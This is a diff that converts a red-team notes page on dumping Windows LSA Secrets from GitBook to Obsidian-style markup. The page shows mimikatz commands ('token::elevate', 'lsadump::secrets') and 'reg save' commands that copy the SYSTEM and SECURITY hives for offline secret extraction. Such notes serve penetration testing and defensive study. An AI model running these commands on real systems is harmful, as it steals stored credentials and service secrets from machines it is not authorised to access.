@@ -12,7 +12,7 @@ LSA Secrets are stored in registry:
 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-20-39.png>)
+![[Screenshot from 2019-03-12 20-20-39.png]]
 
 ## Execution
 
@@ -20,36 +20,33 @@ HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
 
 Secrets can be dumped from memory like so:
 
-{% code title="attacker@mimikatz" %}
 ```
+// attacker@mimikatz
 token::elevate
 lsadump::secrets
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-25-01.png>)
+![[Screenshot from 2019-03-12 20-25-01.png]]
 
 ### Registry
 
 LSA secrets can be dumped from registry hives likes so:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 reg save HKLM\SYSTEM system & reg save HKLM\security security
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-37-11.png>)
+![[Screenshot from 2019-03-12 20-37-11.png]]
 
-{% code title="attacker@mimikatz" %}
 ```csharp
+// attacker@mimikatz
 lsadump::secrets /system:c:\temp\system /security:c:\temp\security
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-38-02.png>)
+![[Screenshot from 2019-03-12 20-38-02.png]]
 
 ## References
 
-{% embed url="https://www.passcape.com/index.php?section=docsys&cmd=details&id=23" %}
+[www.passcape.com/index.php?section=docsys&cmd=details&id=23](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)
 
